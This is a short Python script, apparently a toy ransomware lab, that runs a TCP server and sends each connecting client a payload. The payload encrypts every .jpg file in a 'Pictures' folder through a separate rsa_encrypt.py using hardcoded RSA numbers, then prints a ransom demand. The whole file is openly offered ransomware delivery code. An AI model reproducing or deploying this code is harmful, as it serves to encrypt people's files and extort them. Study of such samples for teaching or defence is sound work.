#!/usr/bin/env python3

import sys
import socket

def establish_tcp_connection(server_port):
    try:
        # Create a socket object
        sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sockfd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind the socket to the server IP and port
        sockfd.bind(("", server_port))

        # Listen for incoming connections
        
        sockfd.listen(5)

        # Accept incoming connection
        client_sock, client_addr = sockfd.accept()

        print(f'Connection established with {client_addr}')

        return client_sock
    except Exception as e:
        print(f"Failed to establish TCP connection: {e}")
        return None

def main():
    if len(sys.argv) != 2:
        print(f"usage: {__file__} <Server Port>")
        exit(-1)

    
    server_port = int(sys.argv[1])

    print(f'Server listening on {server_port}')
    # Establish TCP connection with client
    while True:
        try:
            client_sock = establish_tcp_connection(server_port)
            if client_sock is None:
                exit(-1)
            
            # Send a response to the client
            code = """
import os
import subprocess
from pathlib import Path

n = 22291846172619859445381409012451
e = 65535


pathname = 'Pictures'
encrypt  = 'rsa_encrypt.py'

print("start encryting...")

for filename in os.listdir(pathname):
    if not filename.endswith('.jpg'):
        continue
    picture = os.path.join(pathname, filename)
    command = ['python3', encrypt, str(n), str(e), picture]
    subprocess.run(command)


print("//////////////////////////////////////////")
print("//////////        ERROR         //////////")
print("////////// Give me ransom haha! //////////")
print("//////////////////////////////////////////")
            """
            client_sock.sendall(code.encode())
        
        # Close the connection
        except KeyboardInterrupt:
            print('\nDetected CTRL + C pressed and exiting ...')
            return

if __name__ == '__main__':
    main()
